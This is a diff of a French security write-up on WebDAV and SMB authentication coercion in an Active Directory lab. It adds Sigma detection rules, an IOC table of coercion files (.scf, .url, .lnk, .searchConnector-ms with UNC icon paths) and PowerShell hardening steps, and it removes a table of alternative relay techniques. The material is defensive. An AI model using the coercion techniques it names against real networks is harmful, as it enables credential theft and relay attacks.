-| 4697 | Security | Installation de service (audit) |
-
-### Règle Sigma — Activation du service WebClient
 
 ```yaml
 title: Service WebClient démarré sur un serveur
-id: 8c3e1a2b-5d7f-4e9a-b8c2-3f6a7d1e5b9c
+id: sc-ad-011-002
 status: experimental
-description: Détecte l'activation du service WebClient sur Windows Server (ne devrait jamais tourner sur les serveurs)
+description: Détecte l'activation du service WebClient sur Windows Server — ne devrait jamais tourner sur un serveur
 logsource:
     product: windows
     service: system
@@ -470,30 +421,117 @@ falsepositives:
     - Utilisation légitime de WebDAV (rare sur les serveurs)
 level: critical
 tags:
+    - attack.credential_access
     - attack.t1187
     - attack.t1071.001
 ```
 
+```yaml
+title: Enregistrement DNS créé via LDAP par un utilisateur non-admin
+id: sc-ad-011-003
+status: experimental
+description: Détecte l'ajout d'un enregistrement DNS par un utilisateur standard — indicateur de WebDAV coerce setup
+logsource:
+    product: windows
+    service: dns-server
+detection:
+    selection:
+        EventID: 8001
+    filter:
+        SubjectUserName|endswith: '$'
+    condition: selection and not filter
+level: medium
+tags:
+    - attack.credential_access
+    - attack.t1187
+```
+
+### IOC
+
+| Type | Valeur | Contexte |
+|------|--------|----------|
+| Fichier | `*.searchConnector-ms` sur un share | Activation WebClient |
+| Fichier | `*.scf` avec `IconFile=\\...` | Coercion SMB via icône |
+| Fichier | `*.url` avec `IconFile=\\...` | Coercion SMB via raccourci |
+| Fichier | `*.lnk` pointant vers UNC externe | Coercion SMB via raccourci |
+| Service | WebClient running sur Windows Server | Précondition WebDAV coerce |
+| DNS | Enregistrement A créé par un user standard | Setup WebDAV coerce |
+| Réseau | Auth HTTP sortante vers une IP non-DC | WebDAV coerce en cours |
+
 ---
 
-## Techniques Alternatives
+## Remédiation Secure by Design
 
-| Technique | Description | Pourquoi non utilisée ici |
-|-----------|-------------|---------------------------|
-| ntlmrelayx HTTP → LDAP | Relayer la coercion HTTP vers LDAP pour RBCD/Shadow Credentials | Concept démontré avec Responder ; une attaque en production utiliserait ntlmrelayx |
-| Fichier .library-ms | Similaire au .searchConnector-ms, déclenche le WebClient | Le module drop-sc couvre ce cas d'usage |
-| Fichier .theme | Fichier thème Windows avec chemin UNC pour l'icône | Nécessite que l'utilisateur applique le thème (plus d'interaction) |
-| Détournement RDP | Hijack de sessions RDP déconnectées | Vecteur d'attaque différent, couvert dans d'autres scénarios |
+### 0-24h (urgence)
+
+- Désactiver le service WebClient sur tous les serveurs :
+  ```powershell
+  Stop-Service WebClient -Force
+  Set-Service WebClient -StartupType Disabled
+  ```
+- Restreindre l'accès en écriture sur les partages — supprimer "Everyone" et "Domain Users" :
+  ```powershell
+  Revoke-SmbShareAccess -Name "all" -AccountName "Everyone" -Force
+  Grant-SmbShareAccess -Name "all" -AccountName "NORTH\Share-Writers" -AccessRight Change -Force
+  ```
+
+### 1 semaine
+
+- Activer l'audit SMB avancé sur les serveurs de fichiers :
+  ```powershell
+  auditpol /set /subcategory:"Detailed File Share" /success:enable /failure:enable
+  ```
+- Déployer les règles Sigma ci-dessus dans le SIEM
+- Imposer le SMB signing sur toutes les machines (pas seulement les DC) via GPO
+
+### 1 mois
+
+- Déployer un monitoring d'intégrité des fichiers (FIM) sur tous les dossiers partagés
+- Segmentation réseau pour empêcher l'accès aux partages inter-VLAN
+- Revue trimestrielle des permissions sur les partages partagés
+- Documenter chaque share avec justification métier et matrice d'accès
+
+---
+
+## Architecture cible sécurisée
+
+```mermaid
+graph TB
+    subgraph "Shares sécurisés"
+        CB["CASTELBLACK<br/>SMB signing: True<br/>Share permissions: restricted<br/>WebClient: Disabled<br/>FIM: Active"]
+    end
+
+    subgraph "Serveurs durcis"
+        BR["BRAAVOS<br/>WebClient: Disabled<br/>SMB signing: True<br/>Audit 5145: Enabled"]
+    end
+
+    subgraph "Monitoring"
+        SIEM["SIEM / Wazuh<br/>Event 5145 file creation<br/>Event 7036 WebClient start<br/>DNS record creation<br/>HTTP auth sortante"]
+        FIM["FIM<br/>Surveillance .lnk .scf .url<br/>.searchConnector-ms<br/>Quarantaine automatique"]
+    end
+
+    CB --> SIEM
+    BR --> SIEM
+    CB --> FIM
+
+    style CB fill:#00aa00,stroke:#333,color:#fff
+    style BR fill:#00aa00,stroke:#333,color:#fff
+    style SIEM fill:#0066cc,stroke:#333,color:#fff
+    style FIM fill:#0066cc,stroke:#333,color:#fff
+```
 
 ---
 
 ## Références
 
-| Référence | URL |
-|-----------|-----|
-| Mayfly277 GOAD Part 13 | https://mayfly277.github.io/posts/GOADv2-pwning-part13/ |
-| Gabriel Prud'homme — Talk Coercion | https://www.youtube.com/watch?v=b0lLxLJKaRs |
-| MITRE T1187 | https://attack.mitre.org/techniques/T1187/ |
-| Coercer Tool | https://github.com/p0dalirius/Coercer |
-| krbrelayx (dnstool.py) | https://github.com/dirkjanm/krbrelayx |
-| WebClient Attack | https://www.bitsadmin.com/blog/spooling-printers |
+- [mayfly277 — GOAD Part 13 Having fun inside a domain](https://mayfly277.github.io/posts/GOADv2-pwning-part13/)
+- [Gabriel Prud'homme — Coerce Talk](https://www.youtube.com/watch?v=b0lLxLJKaRs)
+- [p0dalirius — Coercer](https://github.com/p0dalirius/Coercer)
+- [dirkjanm — krbrelayx (dnstool.py)](https://github.com/dirkjanm/krbrelayx)
+- [bitsadmin — WebClient Attack](https://www.bitsadmin.com/blog/spooling-printers)
+- [MITRE ATT&CK T1187 — Forced Authentication](https://attack.mitre.org/techniques/T1187/)
+- [MITRE ATT&CK T1557 — Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557/)
+
+---
+
+*HikenRoot Forge — SC-AD-011 — Nadyr Chouarhi (hik3nR00t) — Mars 2026*
